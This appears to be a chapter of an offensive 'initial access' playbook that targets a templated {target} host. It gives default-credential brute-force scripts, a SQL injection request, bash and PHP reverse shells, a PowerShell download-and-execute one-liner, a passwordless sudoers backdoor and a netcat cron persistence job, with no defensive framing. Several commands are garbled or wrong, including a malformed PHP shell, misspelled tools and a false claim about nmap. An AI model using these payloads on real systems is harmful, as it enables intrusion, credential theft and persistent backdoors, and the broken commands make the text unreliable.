# 04- Foothold: Initial Access Operations

Gain persistent access by exploiting service misconfigurations, stale credentials, and default passwords.

### Attack Workflow
1. **Port & Service Enumeration**: Identify services running, their versions, and exposed paths.
2. **Fingerprint Parsing**: Use Banner Grabbing to identify specific software versions with known vulnerabilities.
3. **Credential Harvesting**: Exploit web-based forms, API endpoints, or database backdoors.
4. **Exploitation**: Execute Remote Code Execution (RCE) or escalate privileges.
5. **Persistence**: Install shellback or set up cron jobs to maintain access to `{target}`.

### Commands Section

#### Service Enumeration
```bash
# Comprehensive open ports and services
nmap -sC -sV -p- {target}

# Parse service banners for version clues
for port in $(nmap -sV {target} | grep open | awk '{print $3}'); do
  curl -s --max-time 5 --data-urlencode "$port:$port" {target} | head -1
done
```

#### Credential Attacks
```bash
# Web-based login enumeration (Fuzzing common user/pass patterns)
python3 -c "
import requests
import string
users = ['admin', 'root', 'administrator', 'guest']
passwords = ['123456', 'admin', 'password', 'qwerty', 'default']
for u in users:
  for p in passwords:
    r = requests.post(f'{target}/login', data={'username': u, 'password': p})
    if r.status_code in [200, 302]:
      print(f'*** Found: {u}:{p} ***')
"
```

#### Web Vulnerability Exploitation
```bash
# Enumerate admin panels using directory crawler
ffu -w /path/to/wordlist.txt -u "http://{target}/" -r 10 -v

# Exploit SQL Injection via UNION SELECT
curl "http://{target}/search?id=1 UNION SELECT username,password FROM users--" -X POST
```

#### RCE Payload Delivery
```bash
# PHP Reverse Shell using nc (Linux)
php -r "$cmd=shell_exec('cat /etc/passwd'); $c=exec('cat /dev/tcp/{target}/8080 0>&1'); $r=exec('cat /dev/tcp/{target}/8080 2>&1'); echo $r; exec($cmd); exec($c); exec($r);" > /tmp/rce.php
curl -X POST --data-binary "@/tmp/rce.php" http://{target}/upload.php

# Bash Reverse Shell (Linux)
bash -i >& /dev/tcp/{target}/4444 0>&1
```

#### Persistence Setup
```bash
# Add user to sudoers via backdoor script
echo '{target}/backdoor.sh ALL=(ALL) NOPASSWD:ALL' >> {target}/etc/sudoers.d/backdoor

# Install cron job to execute backdoor
crontab -e
# Add: 0 * * * * /usr/bin/nc -e /bin/bash 127.0.0.1 4444 > /dev/null 2>&1
```

### Tips & Shortcuts
- **Bash**: `nmap -sC -sV` auto-discovers exploits; `nmap --script` runs NSE.
- **Python**: `requests.post` is faster than `curl` for complex payloads.
- **Windows**: Use `powershell -c "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('{target}/payload.ps1')"`.
- **Reverse vs Bind**: Use reverse shells to maintain control without exposing your machine to egress filters.

### Common Mistakes
- **Scanning too broadly**: Focus only on high-risk ports (21, 22, 23, 80, 443, 3306, 1433).
- **Ignoring version info**: Default passwords often depend on specific software versions.
- **Forgetting persistence**: A one-time access is useless without re-access capability.
- **Missing lateral movement**: Once inside `{target}`, try to move to domain controllers.

### Mini Automation Scripts

#### Python: Credential Brute-forcer with Web Check
```python
#!/usr/bin/env python3
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

target = "{target}"
users = ['admin', 'root', 'administrator', 'guest', 'nagios']
passwords = ['123456', 'admin', 'password', 'root', 'default', 'nagios']

def check_cred(u, p):
    r = requests.post(f'{target}/login', json={'username': u, 'password': p}, allow_redirects=False)
    if r.status_code == 200 and 'login' not in r.text.lower():
        return f'ACCESS: {u}:{p}'
    return None

for u, p in itertools.product(users, passwords):
    res = check_cred(u, p)
    if res:
        print(res)
        break
```

#### Bash: Directory Fuzzer with Timeout
```bash
#!/bin/bash
DOMAIN="${target}"
WORDLIST="/path/to/dirwordlist.txt"
MAX_RETRIES=10

# Use gobuster to find web directories
echo "[*] Starting directory enumeration..."
gobuster d -u "http://$DOMAIN" -w "$WORDLIST" -t 10 -e

# If specific subdomain exists, test for vulnerabilities
if [ -z "$DIR" ]; then
    echo "[!] No directories found, stopping."
else
    echo "[+] Found directory: $DIR"
    ffu -w "$WORDLIST" -u "http://$DOMAIN$DIR/" -t 5
fi
```